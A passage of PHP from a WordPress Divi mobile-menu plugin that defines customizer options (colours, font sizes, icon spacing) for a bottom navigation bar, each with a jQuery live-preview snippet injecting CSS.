) );

$circle_stretch->createOption( array(
'name' => ''.esc_html__( "Icon Distance Right", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_icon_dis_right',
'type' => 'number',
'default' => '0',
'min' => '-50',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>body #dm_nav .bc-stretchy-nav.nav-is-visible ul .menu-item a::after {margin-right: " + value + "px !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Icon Settings", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_icon_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul a::after {color: " + value + " !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Active Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_active_icon_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul .current-menu-item a::after {color: " + value + " !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Icon Colour Hover", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_icon_color_hover',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul a:hover::after {color: " + value + " !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Icon Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_icon_font_size',
'type' => 'number',
'default' => '20',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul a::after {font-size: " + value + "px !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Text Settings", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Text Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_text_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul a {color: " + value + " !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Active Text Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_active_text_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul .current-menu-item a {color: " + value + " !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Text Colour Hover", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_text_color_hover',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul a:hover {color: " + value + " !important;}</style>");
',
) );

$bottom_nav->createOption( array(
'name' => ''.esc_html__( "Text Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_bottom_nav_text_font_size',
'type' => 'number',
'default' => '10',
'min' => '1',
'max' => '50',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>body .bottom-navigation-menu ul a {font-size: " + value + "px !important;}</style>");
',
) );

}
add_action( 'tf_create_options', 'divi_mobile_menu_settings' );
